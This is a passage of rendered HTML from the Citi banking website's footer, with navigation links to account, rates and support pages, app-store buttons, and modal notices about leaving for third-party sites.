                                    <div _ngcontent-ssr-c100="" class="navigation">
                                        <div _ngcontent-ssr-c100="" class="content">
                                            <div _ngcontent-ssr-c100="" role="group" class="section">
                                                <div _ngcontent-ssr-c100="" class="title" id="nav-list-header0">Why Citi</div>
                                                <button _ngcontent-ssr-c100="" type="button" class="title" aria-controls="list0" aria-expanded="false">Why Citi</button>
                                                <ul _ngcontent-ssr-c100="" id="list0" aria-labelledby="nav-list-header0" aria-hidden="true">
                                                    <li _ngcontent-ssr-c100="" id="navOurStory">
                                                        <citi-cta _ngcontent-ssr-c100="" type="tertiary" _nghost-ssr-c36="">
                                                            <a _ngcontent-ssr-c36="" target="_self" id="639e80f0-d548-6f20-4a72-8973faa63ecc" tabindex="-1" href="http://www.citigroup.com/citi/" class="btn btn-link">Our Story</a>
                                                        </citi-cta>
                                                    </li>
                                                    <li _ngcontent-ssr-c100="" id="navBenefits&amp;Services">
                                                        <citi-cta _ngcontent-ssr-c100="" type="tertiary" _nghost-ssr-c36="">
                                                            <a
                                                                _ngcontent-ssr-c36=""
                                                                target="_self"
                                                                id="c609564a-8104-bd00-9da9-118b5111f734"
                                                                tabindex="-1"
                                                                href="https://online.citi.com/US/JRS/pands/detail.do?ID=ServicesOverview"
                                                                class="btn btn-link"
                                                            >
                                                                Benefits and Services
                                                            </a>
                                                        </citi-cta>
                                                    </li>
                                                    <li _ngcontent-ssr-c100="" id="navRewards">
                                                        <citi-cta _ngcontent-ssr-c100="" type="tertiary" _nghost-ssr-c36="">
                                                            <a
                                                                _ngcontent-ssr-c36=""
                                                                target="_self"
                                                                id="051224aa-9f9e-1782-5c5a-b83154683f77"
                                                                tabindex="-1"
                                                                href="https://online.citi.com/US/JRS/pands/detail.do?ID=Rewards"
                                                                class="btn btn-link"
                                                            >
                                                                Rewards
                                                            </a>
                                                        </citi-cta>
                                                    </li>
                                                    <li _ngcontent-ssr-c100="" id="navCitiEasyDeals">
                                                        <citi-cta _ngcontent-ssr-c100="" type="tertiary" _nghost-ssr-c36="">
                                                            <a
                                                                _ngcontent-ssr-c36=""
                                                                target="_blank"
                                                                id="771444c7-a353-a7ed-76a4-5fcebb616bdf"
                                                                tabindex="-1"
                                                                href="https://citieasydeals.com/"
                                                                aria-describedby="a53b4fe2-b5cf-e543-82fe-0a819fdc2e8e_ariadescription"
                                                                class="btn btn-link"
                                                            >
                                                                Citi Easy Deals<sup>SM</sup>
                                                            </a>
                                                            <span _ngcontent-ssr-c36="" aria-hidden="true" class="sr-only" id="a53b4fe2-b5cf-e543-82fe-0a819fdc2e8e_ariadescription">Opens in new window</span>
                                                        </citi-cta>
                                                    </li>
                                                    <li _ngcontent-ssr-c100="" id="navPrivatePass">
                                                        <citi-cta _ngcontent-ssr-c100="" type="tertiary" _nghost-ssr-c36="">
                                                            <a
                                                                _ngcontent-ssr-c36=""
                                                                target="_blank"
                                                                id="63676f17-57ba-3dc8-7ef0-734daf90f26a"
                                                                tabindex="-1"
                                                                href="http://www.citiprivatepass.com/"
                                                                aria-describedby="f9de3508-d902-1652-741a-60de37d363de_ariadescription"
                                                                class="btn btn-link"
                                                            >
                                                                Citi Entertainment<sup>SM</sup>
                                                            </a>
                                                            <span _ngcontent-ssr-c36="" aria-hidden="true" class="sr-only" id="f9de3508-d902-1652-741a-60de37d363de_ariadescription">Opens in new window</span>
                                                        </citi-cta>
                                                    </li>
                                                    <li _ngcontent-ssr-c100="" id="navSpecialOffers">
                                                        <citi-cta _ngcontent-ssr-c100="" type="tertiary" _nghost-ssr-c36="">
                                                            <a
                                                                _ngcontent-ssr-c36=""
                                                                target="_self"
                                                                id="35dc4f05-b0b0-ce66-c7bf-71d978e40760"
                                                                tabindex="-1"
                                                                href="https://online.citi.com/US/JRS/portal/template.do?ID=SpecialOffers"
                                                                class="btn btn-link"
                                                            >
                                                                Special Offers
                                                            </a>
                                                        </citi-cta>
                                                    </li>
                                                </ul>
                                            </div>
                                            <div _ngcontent-ssr-c100="" role="group" class="section">
                                                <div _ngcontent-ssr-c100="" class="title" id="nav-list-header1">Wealth Management</div>
                                                <button _ngcontent-ssr-c100="" type="button" class="title" aria-controls="list1" aria-expanded="false">Wealth Management</button>
                                                <ul _ngcontent-ssr-c100="" id="list1" aria-labelledby="nav-list-header1" aria-hidden="true">
                                                    <li _ngcontent-ssr-c100="" id="navCitiPrivateClient">
                                                        <citi-cta _ngcontent-ssr-c100="" type="tertiary" _nghost-ssr-c36="">
                                                            <a _ngcontent-ssr-c36="" target="_self" id="2d0d0ec2-84c5-e508-f43b-25da504bd5bc" tabindex="-1" href="https://online.citi.com/US/ag/citigold-private-client" class="btn btn-link">
                                                                Citigold<sup>®</sup> Private Client
                                                            </a>
                                                        </citi-cta>
                                                    </li>
                                                    <li _ngcontent-ssr-c100="" id="navCitigold">
                                                        <citi-cta _ngcontent-ssr-c100="" type="tertiary" _nghost-ssr-c36="">
                                                            <a
                                                                _ngcontent-ssr-c36=""
                                                                target="_self"
                                                                id="e8773c92-8fa7-cf7d-3039-b0166894649f"
                                                                tabindex="-1"
                                                                href="https://online.citi.com/US/JRS/pands/detail.do?ID=CitigoldOverview"
                                                                class="btn btn-link"
                                                            >
                                                                Citigold<sup>®</sup>
                                                            </a>
                                                        </citi-cta>
                                                    </li>
                                                    <li _ngcontent-ssr-c100="" id="navCitiPriority">
                                                        <citi-cta _ngcontent-ssr-c100="" type="tertiary" _nghost-ssr-c36="">
                                                            <a
                                                                _ngcontent-ssr-c36=""
                                                                target="_self"
                                                                id="3cb962e0-4c9e-7eaf-d9df-bc455d589356"
                                                                tabindex="-1"
                                                                href="https://online.citi.com/US/JRS/pands/detail.do?ID=CitiPriorityOverview"
                                                                class="btn btn-link"
                                                            >
                                                                Citi Priority
                                                            </a>
                                                        </citi-cta>
                                                    </li>
                                                    <li _ngcontent-ssr-c100="" id="navCitiPrivateBank">
                                                        <citi-cta _ngcontent-ssr-c100="" type="tertiary" _nghost-ssr-c36="">
                                                            <a _ngcontent-ssr-c36="" target="_self" id="56a18c19-1e26-34d4-3f0a-77ec65bd515a" tabindex="-1" href="https://www.privatebank.citibank.com/" class="btn btn-link">
                                                                Citi Private Bank
                                                            </a>
                                                        </citi-cta>
                                                    </li>
                                                </ul>
                                            </div>
                                            <div _ngcontent-ssr-c100="" role="group" class="section">
                                                <div _ngcontent-ssr-c100="" class="title" id="nav-list-header2">Business Banking</div>
                                                <button _ngcontent-ssr-c100="" type="button" class="title" aria-controls="list2" aria-expanded="false">Business Banking</button>
                                                <ul _ngcontent-ssr-c100="" id="list2" aria-labelledby="nav-list-header2" aria-hidden="true">
                                                    <li _ngcontent-ssr-c100="" id="navSmallBusinessAccounts">
                                                        <citi-cta _ngcontent-ssr-c100="" type="tertiary" _nghost-ssr-c36="">
                                                            <a _ngcontent-ssr-c36="" target="_self" id="58074dcd-a930-1efd-8bd1-614b23c0227a" tabindex="-1" href="https://online.citi.com/US/ag/small-business-banking" class="btn btn-link">
                                                                Small Business Accounts
                                                            </a>
                                                        </citi-cta>
                                                    </li>
                                                    <li _ngcontent-ssr-c100="" id="navCommercialAccounts">
                                                        <citi-cta _ngcontent-ssr-c100="" type="tertiary" _nghost-ssr-c36="">
                                                            <a
                                                                _ngcontent-ssr-c36=""
                                                                target="_self"
                                                                id="0351f412-1386-bfed-e84c-1167cf55c1f5"
                                                                tabindex="-1"
                                                                href="https://online.citi.com/US/JRS/pands/detail.do?ID=CitiCommercialBanking"
                                                                class="btn btn-link"
                                                            >
                                                                Commercial Accounts
                                                            </a>
                                                        </citi-cta>
                                                    </li>
                                                </ul>
                                            </div>
                                            <div _ngcontent-ssr-c100="" role="group" class="section">
                                                <div _ngcontent-ssr-c100="" class="title" id="nav-list-header3">Rates</div>
                                                <button _ngcontent-ssr-c100="" type="button" class="title" aria-controls="list3" aria-expanded="false">Rates</button>
                                                <ul _ngcontent-ssr-c100="" id="list3" aria-labelledby="nav-list-header3" aria-hidden="true">
                                                    <li _ngcontent-ssr-c100="" id="navPersonal Banking">
                                                        <citi-cta _ngcontent-ssr-c100="" type="tertiary" _nghost-ssr-c36="">
                                                            <a
                                                                _ngcontent-ssr-c36=""
                                                                target="_self"
                                                                id="4c31308a-16dd-3812-4300-92fd3c78ba8c"
                                                                tabindex="-1"
                                                                href="https://online.citi.com/US/ag/current-interest-rates/checking-saving-accounts"
                                                                class="btn btn-link"
                                                            >
                                                                Personal Banking
                                                            </a>
                                                        </citi-cta>
                                                    </li>
                                                    <li _ngcontent-ssr-c100="" id="navCreditCards">
                                                        <citi-cta _ngcontent-ssr-c100="" type="tertiary" _nghost-ssr-c36="">
                                                            <a
                                                                _ngcontent-ssr-c36=""
                                                                target="_self"
                                                                id="1830e11e-e27d-724c-7851-0473c00c5b37"
                                                                tabindex="-1"
                                                                href="https://www.citi.com/credit-cards/compare-credit-cards/citi.action?ID=view-all-credit-cards"
                                                                class="btn btn-link"
                                                            >
                                                                Credit Cards
                                                            </a>
                                                        </citi-cta>
                                                    </li>
                                                    <li _ngcontent-ssr-c100="" id="navMortgage">
                                                        <citi-cta _ngcontent-ssr-c100="" type="tertiary" _nghost-ssr-c36="">
                                                            <a
                                                                _ngcontent-ssr-c36=""
                                                                target="_self"
                                                                id="810ab925-54fb-e892-cf0b-9b6b11edd37b"
                                                                tabindex="-1"
                                                                href="https://online.citi.com/US/JRS/portal/template.do?ID=todays_mortgage_rates&amp;type=buy"
                                                                class="btn btn-link"
                                                            >
                                                                Mortgage
                                                            </a>
                                                        </citi-cta>
                                                    </li>
                                                    <li _ngcontent-ssr-c100="" id="navHomeEquity">
                                                        <citi-cta _ngcontent-ssr-c100="" type="tertiary" _nghost-ssr-c36="">
                                                            <a
                                                                _ngcontent-ssr-c36=""
                                                                target="_self"
                                                                id="b5cb0d9b-ed64-110c-f0c4-896005be6f57"
                                                                tabindex="-1"
                                                                href="https://online.citi.com/US/JRS/portal/template.do?ID=home_equity_rates"
                                                                class="btn btn-link"
                                                            >
                                                                Home Equity
                                                            </a>
                                                        </citi-cta>
                                                    </li>
                                                    <li _ngcontent-ssr-c100="" id="navLending">
                                                        <citi-cta _ngcontent-ssr-c100="" type="tertiary" _nghost-ssr-c36="">
                                                            <a
                                                                _ngcontent-ssr-c36=""
                                                                target="_self"
                                                                id="1b087b81-466a-0ae6-848b-f279cd821d7d"
                                                                tabindex="-1"
                                                                href="https://online.citi.com/US/ag/current-interest-rates/personal-loans-and-lines-of-credit"
                                                                class="btn btn-link"
                                                            >
                                                                Lending
                                                            </a>
                                                        </citi-cta>
                                                    </li>
                                                </ul>
                                            </div>
                                            <div _ngcontent-ssr-c100="" role="group" class="last section">
                                                <div _ngcontent-ssr-c100="" class="title" id="nav-list-header4">Help &amp; Support</div>
                                                <button _ngcontent-ssr-c100="" type="button" class="title" aria-controls="list4" aria-expanded="false">Help &amp; Support</button>
                                                <ul _ngcontent-ssr-c100="" id="list4" aria-labelledby="nav-list-header4" aria-hidden="true">
                                                    <li _ngcontent-ssr-c100="" id="navContactUs">
                                                        <citi-cta _ngcontent-ssr-c100="" type="tertiary" _nghost-ssr-c36="">
                                                            <a _ngcontent-ssr-c36="" target="_self" id="fae30d5a-3f3c-21f1-98cd-bf6af5ec616e" tabindex="-1" href="https://online.citi.com/US/ag/contactus" class="btn btn-link">Contact Us</a>
                                                        </citi-cta>
                                                    </li>
                                                    <li _ngcontent-ssr-c100="" id="navHelpFAQs">
                                                        <citi-cta _ngcontent-ssr-c100="" type="tertiary" _nghost-ssr-c36="">
                                                            <a _ngcontent-ssr-c36="" target="_self" id="9292e05b-8101-1560-bdd7-094288e448a7" tabindex="-1" href="https://online.citi.com/US/ag/helptopic" class="btn btn-link">
                                                                Help &amp; FAQs
                                                            </a>
                                                        </citi-cta>
                                                    </li>
                                                    <li _ngcontent-ssr-c100="" id="navSecurityCenter">
                                                        <citi-cta _ngcontent-ssr-c100="" type="tertiary" _nghost-ssr-c36="">
                                                            <a _ngcontent-ssr-c36="" target="_self" id="189a78c0-0842-1621-cc0c-abf8d0beb7b3" tabindex="-1" href="https://online.citi.com/US/ag/security-center" class="btn btn-link">
                                                                Security Center
                                                            </a>
                                                        </citi-cta>
                                                    </li>
                                                </ul>
                                            </div>
                                            <div _ngcontent-ssr-c100="" class="section">
                                                <div _ngcontent-ssr-c100="" class="images">
                                                    <div _ngcontent-ssr-c100="">
                                                        <span _ngcontent-ssr-c100="" id="homeSprite" role="img" aria-label="Equal housing lender" alt="Equal housing lender" class="brandingSprite equalHousing"></span>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </citi-footer-navigation>
                                <citi-social-media _ngcontent-ssr-c99="" _nghost-ssr-c103="">
                                    <div _ngcontent-ssr-c103="" class="social">
                                        <div _ngcontent-ssr-c103="" class="content">
                                            <div _ngcontent-ssr-c103="" class="socialItems">
                                                <div _ngcontent-ssr-c103="">
                                                    <button _ngcontent-ssr-c103=""  aria-label="Get it on Google Play" class="cbol-pre-login-static-assets/citi-branding-assets/images/googlePlay@3x.png">
                                                        <div _ngcontent-ssr-c103="" class="Googleplay"></div>
                                                    </button>
                                                    <citi-modal _ngcontent-ssr-c103="" primarybuttontarget="_blank" _nghost-ssr-c39="">
                                                        <div _ngcontent-ssr-c39="" ddlariahideouterdom="">
                                                            <div _ngcontent-ssr-c39="" tabindex="-1" class="modal citi-modal fade" style="display: none;" id="modal00">
                                                                <div _ngcontent-ssr-c39="" tabindex="-1" class="modal-dialog">
                                                                    <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                                    <div _ngcontent-ssr-c39="" cdktrapfocus="" class="modal-content">
                                                                        <div _ngcontent-ssr-c39="" class="modal-header">
                                                                            <button _ngcontent-ssr-c39="" type="button" aria-label="Close modal" class="close-button">
                                                                                <span _ngcontent-ssr-c39="" aria-hidden="false" class="sr-only">Close</span>
                                                                            </button>
                                                                        </div>
                                                                        <div _ngcontent-ssr-c39="" role="document">
                                                                            <div _ngcontent-ssr-c39="" tabindex="-1" class="modal-body">
                                                                                <div _ngcontent-ssr-c39="" tabindex="-1" class="header"><div _ngcontent-ssr-c103="" title="">Important Information</div></div>
                                                                                <div _ngcontent-ssr-c39="" class="modal-body-content" tabindex="-1">
                                                                                    <p _ngcontent-ssr-c103="">
                                                                                        You are leaving a Citi Website and going to a third party site. That site may have a privacy policy different from Citi and may provide less security
                                                                                        than this Citi site. Citi and its affiliates are not responsible for the products, services, and content on the third party website. Do you want to go
                                                                                        to the third party site? <br />
                                                                                        <br />
                                                                                        Citi is not responsible for the products, services or facilities provided and/or owned by other companies.
                                                                                    </p>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                        <div _ngcontent-ssr-c39="" class="modal-footer">
                                                                            <div _ngcontent-ssr-c39="" class="text-right">
                                                                                <div _ngcontent-ssr-c39="" class="citi-modal-controls">
                                                                                    <citi-cta _ngcontent-ssr-c39="" class="modal-primary-btn btnclassTest" _nghost-ssr-c36="">
                                                                                        <a
                                                                                            _ngcontent-ssr-c36=""
                                                                                            target="_blank"
                                                                                            id="0d5fb126-bf0f-d2d2-2e6c-07b0cceed696"
                                                                                            href="https://play.google.com/store/apps/details?id=com.citi.citimobile"
                                                                                            aria-describedby="f15f4b40-bf9e-249c-f9ab-4fbd36290acd_ariadescription"
                                                                                            class="btn btn-primary"
                                                                                        >
                                                                                            Continue
                                                                                        </a>
                                                                                        <span _ngcontent-ssr-c36="" aria-hidden="true" class="sr-only" id="f15f4b40-bf9e-249c-f9ab-4fbd36290acd_ariadescription">Opens in new window</span>
                                                                                    </citi-cta>
                                                                                    <span _ngcontent-ssr-c39="" aria-hidden="false" class="sr-only"></span>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                                </div>
                                                            </div>
                                                            <div _ngcontent-ssr-c39="" class="modal-backdrop citi-modal-backdrop fade" style="display: none;"></div>
                                                        </div>
                                                    </citi-modal>
                                                </div>
                                                <div _ngcontent-ssr-c103="">
                                                    <button _ngcontent-ssr-c103=""  aria-label="Download on the App Store" class="cbol-pre-login-static-assets/citi-branding-assets/images/appStore@3x.png">
                                                        <div _ngcontent-ssr-c103="" class="Appstore"></div>
                                                    </button>
                                                    <citi-modal _ngcontent-ssr-c103="" primarybuttontarget="_blank" _nghost-ssr-c39="">
                                                        <div _ngcontent-ssr-c39="" ddlariahideouterdom="">
                                                            <div _ngcontent-ssr-c39="" tabindex="-1" class="modal citi-modal fade" style="display: none;" id="modal01">
                                                                <div _ngcontent-ssr-c39="" tabindex="-1" class="modal-dialog">
                                                                    <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                                    <div _ngcontent-ssr-c39="" cdktrapfocus="" class="modal-content">
                                                                        <div _ngcontent-ssr-c39="" class="modal-header">
                                                                            <button _ngcontent-ssr-c39="" type="button" aria-label="Close modal" class="close-button">
                                                                                <span _ngcontent-ssr-c39="" aria-hidden="false" class="sr-only">Close</span>
                                                                            </button>
                                                                        </div>
                                                                        <div _ngcontent-ssr-c39="" role="document">
                                                                            <div _ngcontent-ssr-c39="" tabindex="-1" class="modal-body">
                                                                                <div _ngcontent-ssr-c39="" tabindex="-1" class="header"><div _ngcontent-ssr-c103="" title="">Important Information</div></div>
                                                                                <div _ngcontent-ssr-c39="" class="modal-body-content" tabindex="-1">
                                                                                    <p _ngcontent-ssr-c103="">
                                                                                        You are leaving a Citi Website and going to a third party site. That site may have a privacy policy different from Citi and may provide less security
                                                                                        than this Citi site. Citi and its affiliates are not responsible for the products, services, and content on the third party website. Do you want to go
                                                                                        to the third party site? <br />
                                                                                        <br />
                                                                                        Citi is not responsible for the products, services or facilities provided and/or owned by other companies.
                                                                                    </p>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                        <div _ngcontent-ssr-c39="" class="modal-footer">
                                                                            <div _ngcontent-ssr-c39="" class="text-right">
                                                                                <div _ngcontent-ssr-c39="" class="citi-modal-controls">
                                                                                    <citi-cta _ngcontent-ssr-c39="" class="modal-primary-btn btnclassTest" _nghost-ssr-c36="">
                                                                                        <a
                                                                                            _ngcontent-ssr-c36=""
                                                                                            target="_blank"
                                                                                            id="12d8f346-0c46-a466-fd2f-4db7f7025065"
                                                                                            href="https://itunes.apple.com/app/citi-mobile-sm/id301724680?mt=8"
                                                                                            aria-describedby="d32395bb-e5d6-f620-363b-8218e5358462_ariadescription"
                                                                                            class="btn btn-primary"
                                                                                        >
                                                                                            Continue
                                                                                        </a>
                                                                                        <span _ngcontent-ssr-c36="" aria-hidden="true" class="sr-only" id="d32395bb-e5d6-f620-363b-8218e5358462_ariadescription">Opens in new window</span>
                                                                                    </citi-cta>
                                                                                    <span _ngcontent-ssr-c39="" aria-hidden="false" class="sr-only"></span>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                                </div>
                                                            </div>
                                                            <div _ngcontent-ssr-c39="" class="modal-backdrop citi-modal-backdrop fade" style="display: none;"></div>
                                                        </div>
                                                    </citi-modal>
                                                </div>
                                                <div _ngcontent-ssr-c103="">
                                                    <citi-modal _ngcontent-ssr-c103="" primarybuttontarget="_blank" _nghost-ssr-c39="">
                                                        <div _ngcontent-ssr-c39="" ddlariahideouterdom="">
                                                            <div _ngcontent-ssr-c39="" tabindex="-1" class="modal citi-modal fade" style="display: none;" id="JDPower-0">
                                                                <div _ngcontent-ssr-c39="" tabindex="-1" class="modal-dialog">
                                                                    <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                                    <div _ngcontent-ssr-c39="" cdktrapfocus="" class="modal-content">
                                                                        <div _ngcontent-ssr-c39="" class="modal-header">
                                                                            <button _ngcontent-ssr-c39="" type="button" aria-label="Close modal" class="close-button">
                                                                                <span _ngcontent-ssr-c39="" aria-hidden="false" class="sr-only">Close</span>
                                                                            </button>
                                                                        </div>
                                                                        <div _ngcontent-ssr-c39="" role="document">
                                                                            <div _ngcontent-ssr-c39="" tabindex="-1" class="modal-body">
                                                                                <div _ngcontent-ssr-c39="" tabindex="-1" class="header">
                                                                                    <div _ngcontent-ssr-c103="" title="">J.D. Power 2019 Mobile App Certification Program&amp;#8480;&lt;span class='sr-only'&gt;Service Mark&lt;/span&gt;</div>
                                                                                </div>
                                                                                <div _ngcontent-ssr-c39="" class="modal-body-content" tabindex="-1">
                                                                                    <p _ngcontent-ssr-c103="">
                                                                                        J.D. Power 2019 Mobile App Certification Program℠<span class="sr-only">Service Mark</span> recognition is based on successful completion of an audit and
                                                                                        exceeding a customer experience benchmark through a survey of recent servicing interactions. For more information, visit
                                                                                    </p>
                                                                                    <a _ngcontent-ssr-c103="">jdpower.com/awards</a>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                        <div _ngcontent-ssr-c39="" class="modal-footer">
                                                                            <div _ngcontent-ssr-c39="" class="text-right">
                                                                                <div _ngcontent-ssr-c39="" class="citi-modal-controls">
                                                                                    <citi-cta _ngcontent-ssr-c39="" class="modal-primary-btn btnclassTest" _nghost-ssr-c36="">
                                                                                        <button
                                                                                            _ngcontent-ssr-c36=""
                                                                                            style="text-align: center;"
                                                                                            type="button"
                                                                                            id="a95da00e-c73d-552b-403f-0616644f1e4d"
                                                                                            role="button"
                                                                                            aria-describedby="12e809ff-1c28-d779-f008-3879b9385555_ariadescription"
                                                                                            class="btn btn-primary"
                                                                                        >
                                                                                            Continue
                                                                                        </button>
                                                                                        <span _ngcontent-ssr-c36="" aria-hidden="true" class="sr-only" id="12e809ff-1c28-d779-f008-3879b9385555_ariadescription">Opens in new window</span>
                                                                                    </citi-cta>
                                                                                    <span _ngcontent-ssr-c39="" aria-hidden="false" class="sr-only"></span>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                                </div>
                                                            </div>
                                                            <div _ngcontent-ssr-c39="" class="modal-backdrop citi-modal-backdrop fade" style="display: none;"></div>
                                                        </div>
                                                    </citi-modal>
                                                    <citi-modal _ngcontent-ssr-c103="" primarybuttontarget="_blank" _nghost-ssr-c39="">
                                                        <div _ngcontent-ssr-c39="" ddlariahideouterdom="">
                                                            <div _ngcontent-ssr-c39="" tabindex="-1" class="modal citi-modal fade" style="display: none;" id="JDPower-1">
                                                                <div _ngcontent-ssr-c39="" tabindex="-1" class="modal-dialog">
                                                                    <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                                    <div _ngcontent-ssr-c39="" cdktrapfocus="" class="modal-content">
                                                                        <div _ngcontent-ssr-c39="" class="modal-header">
                                                                            <button _ngcontent-ssr-c39="" type="button" aria-label="Close modal" class="close-button">
                                                                                <span _ngcontent-ssr-c39="" aria-hidden="false" class="sr-only">Close</span>
                                                                            </button>
                                                                        </div>
                                                                        <div _ngcontent-ssr-c39="" role="document">
                                                                            <div _ngcontent-ssr-c39="" tabindex="-1" class="modal-body">
                                                                                <div _ngcontent-ssr-c39="" tabindex="-1" class="header"><div _ngcontent-ssr-c103="" title="">Important Information</div></div>
                                                                                <div _ngcontent-ssr-c39="" class="modal-body-content" tabindex="-1">
                                                                                    <p _ngcontent-ssr-c103="">
                                                                                        You are leaving a Citi Website and going to a third party site. That site may have a privacy policy different from Citi and may provide less security
                                                                                        than this Citi site. Citi and its affiliates are not responsible for the products, services, and content on the third party website. Do you want to go
                                                                                        to the third party site? <br />
                                                                                        <br />
                                                                                        Citi is not responsible for the products, services or facilities provided and/or owned by other companies.
                                                                                    </p>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                        <div _ngcontent-ssr-c39="" class="modal-footer">
                                                                            <div _ngcontent-ssr-c39="" class="text-right">
                                                                                <div _ngcontent-ssr-c39="" class="citi-modal-controls">
                                                                                    <citi-cta _ngcontent-ssr-c39="" class="modal-primary-btn btnclassTest" _nghost-ssr-c36="">
                                                                                        <a
                                                                                            _ngcontent-ssr-c36=""
                                                                                            target="_blank"
                                                                                            id="7a8ce9b0-eab0-68a7-1a99-e871b7ea160b"
                                                                                            href="http://www.jdpower.com/awards"
                                                                                            aria-describedby="2852a319-aff9-8120-248c-d7369a520650_ariadescription"
                                                                                            class="btn btn-primary"
                                                                                        >
                                                                                            Continue
                                                                                        </a>
                                                                                        <span _ngcontent-ssr-c36="" aria-hidden="true" class="sr-only" id="2852a319-aff9-8120-248c-d7369a520650_ariadescription">Opens in new window</span>
                                                                                    </citi-cta>
                                                                                    <span _ngcontent-ssr-c39="" aria-hidden="false" class="sr-only"></span>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                                </div>
                                                            </div>
                                                            <div _ngcontent-ssr-c39="" class="modal-backdrop citi-modal-backdrop fade" style="display: none;"></div>
                                                        </div>
                                                    </citi-modal>
                                                    <citi-modal _ngcontent-ssr-c103="" primarybuttontarget="_blank" _nghost-ssr-c39="">
                                                        <div _ngcontent-ssr-c39="" ddlariahideouterdom="">
                                                            <div _ngcontent-ssr-c39="" tabindex="-1" class="modal citi-modal fade" style="display: none;" id="modal02">
                                                                <div _ngcontent-ssr-c39="" tabindex="-1" class="modal-dialog">
                                                                    <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                                    <div _ngcontent-ssr-c39="" cdktrapfocus="" class="modal-content">
                                                                        <div _ngcontent-ssr-c39="" class="modal-header">
                                                                            <button _ngcontent-ssr-c39="" type="button" aria-label="Close modal" class="close-button">
                                                                                <span _ngcontent-ssr-c39="" aria-hidden="false" class="sr-only">Close</span>
                                                                            </button>
                                                                        </div>
                                                                        <div _ngcontent-ssr-c39="" role="document">
                                                                            <div _ngcontent-ssr-c39="" tabindex="-1" class="modal-body">
                                                                                <div _ngcontent-ssr-c39="" tabindex="-1" class="header"><div _ngcontent-ssr-c103="" title=""></div></div>
                                                                                <div _ngcontent-ssr-c39="" class="modal-body-content" tabindex="-1"><p _ngcontent-ssr-c103=""></p></div>
                                                                            </div>
                                                                        </div>
                                                                        <div _ngcontent-ssr-c39="" class="modal-footer">
                                                                            <div _ngcontent-ssr-c39="" class="text-right">
                                                                                <div _ngcontent-ssr-c39="" class="citi-modal-controls">
                                                                                    <citi-cta _ngcontent-ssr-c39="" class="modal-primary-btn btnclassTest" _nghost-ssr-c36="">
                                                                                        <button
                                                                                            _ngcontent-ssr-c36=""
                                                                                            style="text-align: center;"
                                                                                            type="button"
                                                                                            id="b1486ed8-3e31-299a-20ce-dd49b36ea10b"
                                                                                            role="button"
                                                                                            aria-describedby="348e5125-4285-dde7-aa3b-dd402ee11fc7_ariadescription"
                                                                                            class="btn btn-primary"
                                                                                        >
                                                                                            Continue
                                                                                        </button>
                                                                                        <span _ngcontent-ssr-c36="" aria-hidden="true" class="sr-only" id="348e5125-4285-dde7-aa3b-dd402ee11fc7_ariadescription">Opens in new window</span>
                                                                                    </citi-cta>
                                                                                    <span _ngcontent-ssr-c39="" aria-hidden="false" class="sr-only"></span>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                                </div>
                                                            </div>
                                                            <div _ngcontent-ssr-c39="" class="modal-backdrop citi-modal-backdrop fade" style="display: none;"></div>
                                                        </div>
                                                    </citi-modal>
                                                </div>
                                            </div>
                                            <div _ngcontent-ssr-c103="" class="socialItems"></div>
                                            <div _ngcontent-ssr-c103="" class="socialItems">
                                                <div _ngcontent-ssr-c103="">
                                                    <button _ngcontent-ssr-c103=""  aria-label="facebook" class="cbol-pre-login-static-assets/citi-branding-assets/images/social-media_facebook@3x.png">
                                                        <div _ngcontent-ssr-c103="" class="facebook"></div>
                                                    </button>
                                                    <citi-modal _ngcontent-ssr-c103="" primarybuttontarget="_blank" _nghost-ssr-c39="">
                                                        <div _ngcontent-ssr-c39="" ddlariahideouterdom="">
                                                            <div _ngcontent-ssr-c39="" tabindex="-1" class="modal citi-modal fade" style="display: none;" id="modal20">
                                                                <div _ngcontent-ssr-c39="" tabindex="-1" class="modal-dialog">
                                                                    <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                                    <div _ngcontent-ssr-c39="" cdktrapfocus="" class="modal-content">
                                                                        <div _ngcontent-ssr-c39="" class="modal-header">
                                                                            <button _ngcontent-ssr-c39="" type="button" aria-label="Close modal" class="close-button">
                                                                                <span _ngcontent-ssr-c39="" aria-hidden="false" class="sr-only">Close</span>
                                                                            </button>
                                                                        </div>
                                                                        <div _ngcontent-ssr-c39="" role="document">
                                                                            <div _ngcontent-ssr-c39="" tabindex="-1" class="modal-body">
                                                                                <div _ngcontent-ssr-c39="" tabindex="-1" class="header"><div _ngcontent-ssr-c103="" title="">Important Information</div></div>
                                                                                <div _ngcontent-ssr-c39="" class="modal-body-content" tabindex="-1">
                                                                                    <p _ngcontent-ssr-c103="">
                                                                                        <p>
                                                                                            You are leaving a Citi Website and going to a third party site. That site may have a privacy policy different from Citi and may provide less
                                                                                            security than this Citi site. Citi and its affiliates are not responsible for the products, services, and content on the third party website. Do you
                                                                                            want to go to the third party site?
                                                                                        </p>
                                                                                        <p>Citi is not responsible for the products, services or facilities provided and/or owned by other companies.</p>
                                                                                    </p>
                                                                                </div>
                                                                            </div>
                                                                        </div>
